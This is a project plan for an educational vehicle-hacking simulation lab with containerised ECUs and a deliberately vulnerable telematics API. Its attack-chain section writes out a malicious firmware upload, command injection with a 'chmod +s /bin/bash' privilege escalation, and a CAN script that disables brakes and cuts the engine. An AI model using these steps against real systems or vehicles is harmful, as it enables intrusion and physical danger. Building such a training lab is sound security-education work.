# CELLULAR ATTACK SIMULATION LAB - COMPREHENSIVE PROJECT DEFINITION

## EXECUTIVE SUMMARY

The **Cellular Attack Simulation Lab** is an enterprise-grade educational platform replicating IOActive's remote vehicle hacking research. Students and security professionals execute a complete attack chain: reconnaissance → telematics compromise → privilege escalation → CAN bus access → vehicle control manipulation. All attacks occur safely in isolated, containerized simulation environments.

**Key Facts:**
- **Timeline:** 12-16 weeks  
- **Team:** 3-5 developers  
- **Budget:** $35,000 - $71,000  
- **Outcome:** Production-ready lab deployable to universities and enterprises  

---

## 1. SYSTEM ARCHITECTURE

### Layered Network Model

```
ATTACKER PHASE
├─ Internet Reconnaissance → Identify vulnerable vehicles on cellular network
├─ Telematics Compromise → Exploit firmware update vulnerability
├─ Privilege Escalation → Gain root on infotainment unit
├─ CAN Bus Access → Bypass gateway, access internal network
└─ Vehicle Control → Inject malicious CAN messages

DEFENDER PHASE
├─ Gateway Filtering → Block unauthorized CAN messages
├─ Network Segmentation → Isolate critical safety systems
├─ Secure Firmware Updates → RSA signatures, certificate validation
└─ Authentication → Strong credentials, MFA where applicable
```

### Core Components

| Component | Purpose | Technology |
|-----------|---------|-----------|
| **CAN Bus Simulator** | Emulates message passing between ECUs | python-can 4.2+ |
| **Virtual ECUs** | Engine, brake, steering, body control modules | Python asyncio processes |
| **Telematics API** | Vulnerable REST service (infotainment unit) | Flask 2.3+ |
| **Gateway Module** | Routes messages, enforces filtering rules | Python rules engine |
| **Firmware System** | Manages firmware updates with/without verification | python-can + crypto libs |
| **Attack Tools** | Reconnaissance, exploitation, CAN injection | Custom Python CLI |
| **Defense Layer** | Authentication, signatures, segmentation | Pydantic validators + cryptography |
| **Monitoring** | Prometheus metrics + Grafana dashboards | Real-time state visualization |
| **Database** | Audit logs, vehicle state persistence | PostgreSQL 14+ |

---

## 2. TECHNOLOGY STACK (RECOMMENDED)

### Core Technologies

```
BACKEND SIMULATION:
  ├─ Python 3.10+ (entire simulation engine)
  ├─ Flask 2.3+ (REST API)
  ├─ python-can 4.2+ (CAN emulation)
  ├─ asyncio (concurrent ECU operations)
  ├─ aiohttp (async HTTP client)
  └─ Pydantic (data validation)

CRYPTOGRAPHY & SECURITY:
  ├─ cryptography>=41.0.0 (RSA signatures, TLS)
  ├─ PyJWT (JWT token generation/validation)
  ├─ bcrypt (password hashing)
  └─ paramiko (SSH simulation)

DATA PERSISTENCE:
  ├─ PostgreSQL 14+ (audit logs, vehicle state)
  ├─ psycopg2 (Python DB driver)
  ├─ SQLAlchemy (ORM)
  └─ Alembic (schema migrations)

MESSAGE QUEUE:
  ├─ RabbitMQ 3.12+ (decouple ECUs)
  └─ pika (Python AMQP client)

MONITORING & OBSERVABILITY:
  ├─ Prometheus (metrics collection)
  ├─ Grafana (dashboards)
  ├─ python-prometheus-client (instrumentation)
  └─ ELK Stack (log aggregation)

WEB FRONTEND:
  ├─ React 18 (SPA dashboard)
  ├─ TypeScript (type safety)
  ├─ Redux (state management)
  ├─ recharts (data visualization)
  └─ Axios (HTTP client)

DEPLOYMENT:
  ├─ Docker 24+ (containerization)
  ├─ Docker Compose 2.0+ (local orchestration)
  ├─ Kubernetes 1.27+ (production orchestration)
  ├─ Helm (K8s package management)
  └─ GitHub Actions (CI/CD)

TESTING:
  ├─ pytest (unit testing)
  ├─ pytest-asyncio (async test support)
  ├─ pytest-cov (coverage reports)
  ├─ faker (test data generation)
  └─ hypothesis (property-based testing)
```

### Why This Stack?

| Technology | Advantages |
|-----------|-----------|
| **Python** | Rapid development, extensive libraries for networking/crypto |
| **Flask** | Lightweight, perfect for demonstrating vulnerabilities |
| **python-can** | Industry-standard, works with real CAN hardware |
| **PostgreSQL** | Enterprise-grade, immutable audit logging capability |
| **Docker** | Reproducible, isolated environments, easy distribution |
| **React** | Modern UX, real-time dashboard updates |
| **Prometheus/Grafana** | Standard observability stack, excellent CAN bus visualization |

---

## 3. DETAILED ATTACK CHAIN

### CAN Message Dictionary

```
0x100 - Steering Control
  Data: [angle_0, angle_1] (0x0000 = -180°, 0xFFFF = +180°)
  Target ECU: Steering Control Unit (ECU3)
  
0x101 - Throttle Control  
  Data: [throttle_percent] (0x00 = 0%, 0xFF = 100%)
  Target ECU: Engine Control Unit (ECU1)
  
0x102 - Brake Control
  Data: [brake_force_0, brake_force_1] (0x0000 = 0%, 0xFFFF = 100%)
  Target ECU: Brake Control Unit (ECU2)
  
0x103 - Door Lock/Unlock
  Data: [0x00 = unlock, 0x01 = lock]
  Target ECU: Body Control Unit (ECU4)
  
0x104 - Engine Start/Stop
  Data: [0x00 = off, 0x01 = on, 0x02 = cranking]
  Target ECU: Engine Control Unit (ECU1)
  
0x105 - Windshield Wipers
  Data: [0x00 = off, 0x01 = low, 0x02 = medium, 0x03 = high]
  Target ECU: Body Control Unit (ECU4)
  
0x106 - Climate Control
  Data: [temperature_celsius, fan_speed_percent]
  Target ECU: Body Control Unit (ECU4)
```

### Stage 1: Reconnaissance (Student Actions)

```bash
# Discover vehicles on network
nmap -p 8080 10.0.0.0/24

# Output:
# Nmap scan report for 10.0.0.5
# Host is up (0.0023s latency).
# 8080/tcp open  http-proxy
# Service: Telematics Service (Uconnect v2.5.1)

# Verify vulnerability
curl http://10.0.0.5:8080/api/v1/status
# Returns: 200 OK (no authentication required!)
```

### Stage 2: Firmware Compromise

```bash
# Create malicious payload that injects CAN messages
python3 create_payload.py \
  --payload-type can-injection \
  --target-ecus "engine,brake,steering"

# Upload firmware (no verification!)
curl -X POST http://10.0.0.5:8080/api/v1/firmware/update \
  -F "firmware=@malicious_firmware.bin"

# Response: "Firmware update successful. System rebooting..."
```

### Stage 3: Privilege Escalation

```bash
# Command injection to escalate privileges
curl -X POST http://10.0.0.5:8080/api/v1/commands \
  -H "Content-Type: application/json" \
  -d '{"cmd": "sudo -l"}'

# Escalate via setuid
curl -X POST http://10.0.0.5:8080/api/v1/commands \
  -d '{"cmd": "chmod +s /bin/bash"}'

# Verify: uid=0 (root)
```

### Stage 4-5: CAN Injection & Vehicle Control

```python
# Student attack script
from can import Message
import can

bus = can.Bus('vcan0', bustype='virtual')

# Unlock doors
msg_unlock = Message(
    arbitration_id=0x103,
    data=[0x00],  # 0x00 = unlock
    is_extended_id=False
)
bus.send(msg_unlock)
# Vehicle output: "Doors unlocked"

# Disable brakes
msg_brake = Message(
    arbitration_id=0x102,
    data=[0x00, 0x00],
    is_extended_id=False
)
bus.send(msg_brake)
# Vehicle output: "Brake system disabled"

# Cut engine
msg_engine = Message(
    arbitration_id=0x104,
    data=[0x00],  # 0x00 = off
    is_extended_id=False
)
bus.send(msg_engine)
# Vehicle output: "Engine shutdown"
```

### Defense: Firmware Signature Verification

```python
# Before: Malicious firmware accepted
POST /api/v1/firmware/update
No signature check required
Result: Compromise successful

# After: Malicious firmware rejected
POST /api/v1/firmware/update
Must include valid RSA-2048 signature
Must include certificate chain
Result: Installation rejected, attack prevented
```

---

## 4. IMPLEMENTATION TIMELINE

### Phase 1: Core CAN Simulation (Weeks 1-4)
- [ ] CAN bus message router
- [ ] Virtual ECU framework
- [ ] ECU implementations (Engine, Brake, Steering, Body)
- [ ] Vehicle state model
- [ ] Unit tests
- [ ] Docker setup

**Deliverable:** Working CAN network with all ECUs responding correctly

### Phase 2: Telematics & Vulnerabilities (Weeks 5-8)
- [ ] Flask REST API
- [ ] Vulnerable endpoints (firmware update, command execution)
- [ ] Firmware management with bugs
- [ ] API documentation
- [ ] Integration tests

**Deliverable:** Fully exploitable telematics system

### Phase 3: Attack Chain Tools (Weeks 9-11)
- [ ] Network reconnaissance tools
- [ ] Payload generation
- [ ] CAN message injection interface
- [ ] Attack workflow automation
- [ ] Student tutorials

**Deliverable:** Complete attack chain students can execute

### Phase 4: Defensive Mechanisms (Weeks 12-14)
- [ ] Gateway filtering rules engine
- [ ] Network segmentation logic
- [ ] Firmware signature verification
- [ ] Authentication module
- [ ] Defense tutorials

**Deliverable:** Hardened configuration and defense education

### Phase 5: Frontend & Production (Weeks 15-16)
- [ ] React attack control dashboard
- [ ] Real-time vehicle state visualization
- [ ] Prometheus metrics collection
- [ ] Grafana dashboard templates
- [ ] Production deployment manifests
- [ ] Comprehensive documentation

**Deliverable:** Complete, production-ready lab

---

## 5. INFRASTRUCTURE REQUIREMENTS

### Minimum Hardware (Single Instance)
- **CPU:** 4 cores @ 2.5 GHz
- **RAM:** 8 GB
- **Storage:** 20 GB
- **Network:** 100 Mbps

### Recommended Hardware (Development)
- **CPU:** 16 cores @ 3.0 GHz
- **RAM:** 32 GB
- **Storage:** 100 GB SSD
- **Network:** 1 Gbps

### Docker Deployment
```bash
docker-compose up -d

Services:
  ├─ can_bus:8080 (message router)
  ├─ ecu_engine:5000 (engine ECU)
  ├─ ecu_brake:5000 (brake ECU)
  ├─ ecu_steering:5000 (steering ECU)
  ├─ ecu_body:5000 (body ECU)
  ├─ telematics_api:8080 (vulnerable service)
  ├─ gateway:9000 (message filtering)
  ├─ postgres:5432 (audit logs)
  ├─ prometheus:9090 (metrics)
  └─ grafana:3000 (dashboards)

Network: 10.0.0.0/24 (isolated)
```

---

## 6. LEARNING OUTCOMES

Students will understand:

✓ **Vehicle Architecture** - How cellular connectivity, telematics, and CAN networks integrate  
✓ **Attack Surfaces** - Infotainment systems as critical entry points  
✓ **Lateral Movement** - Pivoting from external networks to internal systems  
✓ **CAN Security** - Message injection vulnerabilities and real-world impact  
✓ **Defensive Strategies** - Gateway filtering, segmentation, secure updates  
✓ **Cryptography** - Firmware signing, certificate validation, signature verification  

---

## 7. SUCCESS METRICS

### Technical
- CAN message delivery: **100%** (no loss)
- Latency: **<500ms** end-to-end
- Uptime: **99.9%**
- Memory per student: **<2GB**
- Startup time: **<5 minutes**

### Educational
- Attack completion rate: **90%+**
- Assessment pass rate: **80%+**
- Student satisfaction: **4.5/5.0 stars**
- Time to exploit: **<4 hours** (with guidance)

### Operational
- Deployment time: **<10 minutes**
- MTTR: **<1 hour**
- Documentation coverage: **100%**
- Code test coverage: **90%+**

---

## 8. COST BREAKDOWN

| Category | Hours | Rate | Cost |
|----------|-------|------|------|
| Development | 320 | $150/hr | $48,000 |
| Testing/QA | 80 | $120/hr | $9,600 |
| Documentation | 40 | $100/hr | $4,000 |
| Infrastructure | - | - | $3,000 |
| Contingency (10%) | - | - | $6,460 |
| **TOTAL** | | | **$71,060** |

**MVP Budget (optimized):** $35,000-$45,000

---

## 9. KEY ADVANTAGES

✅ **Fully Self-Contained** - No external dependencies, runs offline  
✅ **Safe by Design** - Isolated containers, cannot affect real vehicles  
✅ **Scalable** - Single laptop to enterprise Kubernetes deployment  
✅ **Production-Ready** - Can be deployed immediately  
✅ **Research-Backed** - Based on published IOActive research  
✅ **Extensible** - Easy to add new ECUs, attack vectors, defenses  
✅ **Comprehensive** - Covers attack AND defense strategies  

---

## 10. RISK ASSESSMENT

| Risk | Probability | Impact | Mitigation |
|------|-------------|--------|-----------|
| CAN timing differs from real systems | Medium | Medium | Test against SocketCAN, use real traces |
| Students exploit real vehicles | Low | Critical | Air-gapped network, strict isolation |
| Scaling to 100+ students | High | High | Stateless design, Kubernetes |
| Weak crypto implementation | Low | Critical | Use established libraries, security audit |
| Students stuck in early stages | Medium | Medium | Progressive hints, automated validation |

---

## 11. NEXT STEPS

1. **Review & Approve** this project definition
2. **Assemble Team** - 3-5 developers with Python/networking/security experience
3. **Set Up Repository** - GitHub/GitLab with CI/CD pipeline
4. **Begin Phase 1** - Start CAN bus simulator development
5. **Iterate & Collect Feedback** - Test with early users, refine based on findings

---

## CONCLUSION

The **Cellular Attack Simulation Lab** is a **technically feasible**, **immediately actionable** educational platform that safely demonstrates real-world vehicle cybersecurity vulnerabilities. The project can be completed in 12-16 weeks with a 3-5 person team and delivered to universities, training programs, and security organizations worldwide.

**Status:** Ready for Implementation  
**Version:** 1.0  
**Date:** March 2026

